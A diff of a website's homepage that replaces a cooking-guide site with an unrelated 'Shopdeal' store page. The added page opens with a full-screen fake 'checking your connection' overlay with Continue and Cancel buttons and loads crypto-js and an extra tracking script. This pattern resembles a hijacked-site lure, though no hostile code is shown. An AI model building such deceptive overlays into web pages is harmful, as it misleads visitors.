@@ -1,273 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Nutmeg Spruce | Practical Home Cooking Guides, Seasonal Produce & Kitchen Tools</title>
-<meta name="description" content="Cook with confidence: pantry essentials, cooking techniques, seasonal produce by month, spice pairings, a cups-to-grams converter and safe cooking temperatures.">
-<meta name="robots" content="index, follow">
-<link rel="canonical" href="https://nutmegspruce.com/">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Nutmeg Spruce">
-<meta property="og:title" content="Nutmeg Spruce | Practical Home Cooking Guides, Seasonal Produce & Kitchen Tools">
-<meta property="og:description" content="Cook with confidence: pantry essentials, cooking techniques, seasonal produce by month, spice pairings, a cups-to-grams converter and safe cooking temperatures.">
-<meta property="og:url" content="https://nutmegspruce.com/">
-<meta property="og:image" content="https://images.pexels.com/photos/37192544/pexels-photo-37192544.jpeg?auto=compress&cs=tinysrgb&w=1200">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="theme-color" content="#1E4A3C">
-<link rel="icon" href="assets/images/favicon.svg" type="image/svg+xml">
-<link rel="preconnect" href="https://images.pexels.com">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600&family=Young+Serif&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<!-- Google tag (gtag.js) with Consent Mode v2 -->
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('consent','default',{ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied',analytics_storage:'denied',wait_for_update:500});</script>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script>
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Organization", "name": "Nutmeg Spruce", "url": "https://nutmegspruce.com/", "logo": "https://nutmegspruce.com/assets/images/favicon.svg", "email": "hello@nutmegspruce.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}</script><script type="application/ld+json">{"@context": "https://schema.org", "@type": "WebSite", "name": "Nutmeg Spruce", "url": "https://nutmegspruce.com/"}</script><script type="application/ld+json">{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "Is it worth weighing ingredients instead of using cups?", "acceptedAnswer": {"@type": "Answer", "text": "For baking, yes. Cup measurements vary depending on how you fill the cup, which can change a recipe's result. A digital kitchen scale is inexpensive and makes baking more consistent. For soups, stews and salads, cups and spoons are perfectly fine."}}, {"@type": "Question", "name": "How long do ground spices really last?", "acceptedAnswer": {"@type": "Answer", "text": "They don't spoil in the usual sense, but they lose aroma. Most ground spices are at their best for around a year; whole spices can last two to three years. If a spice smells faint when you rub a pinch between your fingers, it's time to replace it."}}, {"@type": "Question", "name": "Why does my food steam instead of browning?", "acceptedAnswer": {"@type": "Answer", "text": "Usually the pan is overcrowded or not hot enough, or the food is wet. Pat ingredients dry, preheat the pan, and cook in batches so pieces have space around them."}}, {"@type": "Question", "name": "How do I rescue a dish that's too salty?", "acceptedAnswer": {"@type": "Answer", "text": "Add more of the unsalted base (extra vegetables, stock or grains), or balance with a little acid such as lemon juice or vinegar. Dairy like yogurt can also soften saltiness in some dishes."}}, {"@type": "Question", "name": "Do I need expensive equipment to cook well?", "acceptedAnswer": {"@type": "Answer", "text": "No. A sharp chef's knife, a large cutting board, a heavy frying pan, a medium saucepan, a baking tray and an instant-read thermometer will cover most home cooking."}}]}</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-MDs</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
-<header class="site-header"><div class="wrap hdr">
-  <a class="logo" href="index.php" aria-label="Nutmeg Spruce home"><span class="logo-mark"><svg viewBox="0 0 32 32" aria-hidden="true"><path d="M16 4 9 14h4l-5 7h5l-4 6h14l-4-6h5l-5-7h4z" fill="#8FC2A9"/><circle cx="23.5" cy="24.5" r="4.5" fill="#C9A07A"/><path d="M21 23c1.5-.8 3.5-.6 5 .6" stroke="#8A5A36" stroke-width="1.2" fill="none"/></svg></span><span class="logo-text"><b>Nutmeg Spruce</b><small>Cook with confidence</small></span></a>
-  <nav class="nav" id="nav" aria-label="Main"><ul><li><a href="index.php" aria-current="page">Home</a></li><li><a href="about.html">About</a></li><li><a href="services.html">Services</a></li><li><a href="contact.html">Contact</a></li></ul></nav>
-  <a class="btn btn-sm btn-saffron" href="contact.html">Ask a question</a>
-  <button class="burger" type="button" aria-label="Menu" aria-expanded="false" aria-controls="nav"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</div></header>
-<main id="main">
-<!-- 1 HERO -->
-<section class="hero" aria-labelledby="h1">
-  <div class="wrap hero-grid">
-    <div>
-      <span class="kicker">A home-cooking field guide</span>
-      <h1 id="h1">Cook with <span>confidence</span>, one good habit at a time.</h1>
-      <p class="lead">Nutmeg Spruce is a practical guide to everyday cooking. We explain the why behind the how — from stocking a sensible pantry and choosing what's in season to seasoning with spices and cooking food safely.</p>
-      <div class="hero-actions"><a class="btn" href="#principles">Start with the basics</a><a class="btn btn-outline" href="#converter">Try the kitchen tools</a></div>
-      <div class="hero-facts">
-        <div><b>12</b>months of seasonal produce guidance</div>
-        <div><b>14</b>ingredients in our cups-to-grams converter</div>
-        <div><b>3</b>free, interactive kitchen tools</div>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-    <div class="mosaic">
-      <img class="m1" src="https://images.pexels.com/photos/37192544/pexels-photo-37192544.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Whole nutmeg seeds beside a metal grater and a small glass jar on a kitchen counter" width="700" height="900" fetchpriority="high">
-      <span class="stamp">Freshly grated makes a difference</span>
-      <img class="m2" src="https://images.pexels.com/photos/7341848/pexels-photo-7341848.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Shopper choosing ripe tomatoes from a basket at an outdoor market" width="700" height="700">
-      <img class="m3" src="https://images.pexels.com/photos/10432861/pexels-photo-10432861.jpeg?auto=compress&cs=tinysrgb&w=1200" alt="Cook finely slicing fresh herbs with a chef's knife on a wooden board" width="1200" height="500">
-    </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- 2 TOPIC RIBBON -->
-<nav class="ribbon" aria-label="On this page"><div class="wrap"><ol>
-  <li><a href="#principles">Kitchen principles</a></li>
-  <li><a href="#pantry">Pantry essentials</a></li>
-  <li><a href="#techniques">Core techniques</a></li>
-  <li><a href="#produce">What's in season</a></li>
-  <li><a href="#converter">Cups to grams</a></li>
-  <li><a href="#safety">Safe temperatures</a></li>
-</ol></div></nav>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- 3 PRINCIPLES -->
-<section class="sec" id="principles" aria-labelledby="pr-h">
-  <div class="wrap split">
-    <img class="rimg" src="https://images.pexels.com/photos/4252138/pexels-photo-4252138.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Cook slicing tomatoes and peppers on a wooden board in a home kitchen" width="900" height="1125" loading="lazy">
-    <div>
-      <span class="kicker">Start here</span>
-      <h2 id="pr-h">Five habits that improve almost every dish</h2>
-      <p class="lead">Good home cooking is less about recipes and more about a handful of habits. Get these right and even simple meals taste noticeably better.</p>
-      <ol class="steps-list">
-        <li><b>Read the whole recipe first</b><p>Knowing the steps before you start stops the classic mid-recipe scramble and helps you spot anything that needs time, like marinating or preheating.</p></li>
-        <li><b>Prepare before you heat</b><p>Chop, measure and line everything up (“mise en place”). Cooking goes faster and nothing burns while you hunt for the garlic.</p></li>
-        <li><b>Season in stages</b><p>A little salt early lets flavor build; a final taste before serving lets you adjust. Acidity from lemon or vinegar often fixes a dish that tastes flat.</p></li>
-        <li><b>Give food space and heat</b><p>An overcrowded pan steams instead of browning. Cook in batches and let the pan get properly hot.</p></li>
-        <li><b>Rest what you roast</b><p>Letting meat rest for a few minutes keeps it juicier, and it continues to cook gently from its own heat.</p></li>
-      </ol>
-    </div>
-  </div>
-</section>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
 
-<!-- 4 PANTRY -->
-<section class="sec paper" id="pantry" aria-labelledby="pa-h">
-  <div class="wrap">
-    <div class="head"><span class="kicker">Pantry essentials</span><h2 id="pa-h">Six shelves that make weeknight cooking easy</h2><p>A well-stocked pantry means dinner is always within reach. These are the staples we reach for most, with tips on how to store them so they last.</p></div>
-    <div class="pantry">
-      <article class="pcard"><img src="https://images.pexels.com/photos/458796/pexels-photo-458796.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Assorted spices in glass jars on a rustic wooden shelf" width="700" height="467" loading="lazy"><div class="b"><span class="tag">Spices</span><h3>Ground &amp; whole spices</h3><p>Start with cumin, smoked paprika, chili flakes, cinnamon, black peppercorns and whole nutmeg. Whole spices keep their aroma far longer than ground.</p><div class="store">Store: airtight, away from heat and light. Replace ground spices after roughly a year.</div></div></article>
-      <article class="pcard"><img src="https://images.pexels.com/photos/4224263/pexels-photo-4224263.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Glass jars filled with buckwheat, lentils, rice and oats" width="700" height="467" loading="lazy"><div class="b"><span class="tag">Grains</span><h3>Rice, oats &amp; whole grains</h3><p>Long-grain rice, rolled oats and one or two whole grains such as buckwheat or farro cover breakfasts, sides and hearty salads.</p><div class="store">Store: sealed jars in a cool cupboard. Whole grains keep best in the fridge in warm months.</div></div></article>
-      <article class="pcard"><img src="https://images.pexels.com/photos/5507576/pexels-photo-5507576.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Garlic bulbs, rosemary, pink salt and olive oil on a marble surface" width="700" height="467" loading="lazy"><div class="b"><span class="tag">Flavor base</span><h3>Oil, garlic, salt &amp; herbs</h3><p>A good everyday olive oil, a neutral oil for high heat, fresh garlic and a coarse and fine salt are the foundation of most savory cooking.</p><div class="store">Store: oil in a dark cupboard, garlic in a ventilated basket — never in the fridge.</div></div></article>
-      <article class="pcard"><img src="https://images.pexels.com/photos/301669/pexels-photo-301669.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Cinnamon sticks laid on a dark textured surface" width="700" height="467" loading="lazy"><div class="b"><span class="tag">Baking</span><h3>Warm baking spices</h3><p>Cinnamon sticks, star anise, cloves and vanilla bring warmth to baking, porridge, stewed fruit and slow-cooked savory dishes alike.</p><div class="store">Store: whole sticks and pods in small jars; grind or grate only what you need.</div></div></article>
-      <article class="pcard"><img src="https://images.pexels.com/photos/34088834/pexels-photo-34088834.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Crusty artisan bread loaf on a wooden paddle" width="700" height="467" loading="lazy"><div class="b"><span class="tag">Flour</span><h3>Flour &amp; leaveners</h3><p>All-purpose flour, baking powder, baking soda and dried yeast let you bake bread, pancakes and quick cakes whenever you like.</p><div class="store">Store: flour airtight; check the date on baking powder — it loses strength over time.</div></div></article>
-      <article class="pcard"><img src="https://images.pexels.com/photos/8287244/pexels-photo-8287244.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Glass jars of dried beans, lentils and rice on a wooden table" width="700" height="467" loading="lazy"><div class="b"><span class="tag">Pulses</span><h3>Beans &amp; lentils</h3><p>Dried and canned beans, red and green lentils and chickpeas are affordable, filling and endlessly adaptable in soups, curries and salads.</p><div class="store">Store: dried pulses keep for a year or more; older beans simply need longer cooking.</div></div></article>
-    </div>
-  </div>
-</section>
-
-<!-- 5 TECHNIQUES -->
-<section class="sec" id="techniques" aria-labelledby="te-h">
-  <div class="wrap split wide-l">
-    <div>
-      <span class="kicker">Technique library</span>
-      <h2 id="te-h">The core techniques, explained simply</h2>
-      <p class="lead">Most recipes are built from the same small set of skills. Learn what each one does and you can cook confidently without following instructions word for word.</p>
-      <div class="tl" role="tablist" aria-label="Technique groups">
-        <button role="tab" id="tb-m" aria-controls="tp-m" aria-selected="true">Cooking methods</button>
-        <button role="tab" id="tb-k" aria-controls="tp-k" aria-selected="false" tabindex="-1">Knife cuts</button>
-        <button role="tab" id="tb-f" aria-controls="tp-f" aria-selected="false" tabindex="-1">Building flavor</button>
-      </div>
-      <div class="tpanel" role="tabpanel" id="tp-m" aria-labelledby="tb-m"><div class="defs">
-        <div class="def"><b>Sauté</b><p>Cooking small pieces quickly in a little fat over medium-high heat, stirring often, for color and flavor.</p></div>
-        <div class="def"><b>Roast</b><p>Dry heat in a hot oven. Vegetables caramelize at the edges; spread them out so they roast rather than steam.</p></div>
-        <div class="def"><b>Braise</b><p>Browning first, then cooking slowly, partly covered in liquid. Ideal for tougher cuts and hearty vegetables.</p></div>
-        <div class="def"><b>Simmer</b><p>Gentle bubbling just below a boil. Keeps soups and stews tender and stops liquids reducing too fast.</p></div>
-      </div></div>
-      <div class="tpanel" role="tabpanel" id="tp-k" aria-labelledby="tb-k" hidden><div class="defs">
-        <div class="def"><b>Dice</b><p>Even cubes (small, medium or large) so pieces cook at the same speed. Great for soups and sautés.</p></div>
-        <div class="def"><b>Mince</b><p>Very fine pieces, used for garlic, ginger and herbs so flavor spreads evenly through a dish.</p></div>
-        <div class="def"><b>Julienne</b><p>Thin matchsticks, ideal for stir-fries and salads where quick cooking or crunch matters.</p></div>
-        <div class="def"><b>Chiffonade</b><p>Stack leafy herbs, roll tightly and slice into fine ribbons. Perfect for basil and mint.</p></div>
-      </div></div>
-      <div class="tpanel" role="tabpanel" id="tp-f" aria-labelledby="tb-f" hidden><div class="defs">
-        <div class="def"><b>Bloom spices</b><p>Warm ground spices in hot oil for 30–60 seconds before adding liquid to release their aroma.</p></div>
-        <div class="def"><b>Deglaze</b><p>Add a splash of stock or water to a hot pan and scrape up the browned bits — they're concentrated flavor.</p></div>
-        <div class="def"><b>Balance</b><p>Taste for salt, acid, sweetness and heat. If something tastes flat, a squeeze of lemon often helps.</p></div>
-        <div class="def"><b>Finish fresh</b><p>Add delicate herbs, citrus zest or a drizzle of good oil at the end for brightness.</p></div>
-      </div></div>
-    </div>
-    <img class="rimg" src="https://images.pexels.com/photos/5907608/pexels-photo-5907608.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Cook shaping fresh homemade tagliatelle into a nest on a floured board" width="800" height="1000" loading="lazy">
-  </div>
-</section>
-
-<!-- 6 SEASONAL PRODUCE -->
-<section class="sec oat" id="produce" aria-labelledby="se-h">
-  <div class="wrap">
-    <div class="head center"><span class="kicker">Seasonal produce explorer</span><h2 id="se-h">What's in season this month?</h2><p>Produce in season is usually fresher, better tasting and better value. Pick a month to see what's typically at its best across much of the United States.</p></div>
-    <div class="tool">
-      <div class="tool-img"><img src="https://images.pexels.com/photos/319798/pexels-photo-319798.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Fresh organic vegetables displayed at a local market stall" width="900" height="900" loading="lazy"></div>
-      <div class="tool-body">
-        <div>
-          <div class="months" role="group" aria-label="Choose a month"></div>
-          <h3>In season in <span id="pm-name">—</span></h3>
-          <p class="muted" style="margin:0">Vegetables</p><div class="produce" id="pm-veg" aria-live="polite"></div>
-          <p class="muted" style="margin:0">Fruit</p><div class="produce fruit" id="pm-fruit" aria-live="polite"></div>
-          <div class="tipbox">Seasons vary by region and weather — warmer southern states often see produce weeks earlier. Your local farmers' market is always the best guide.</div>
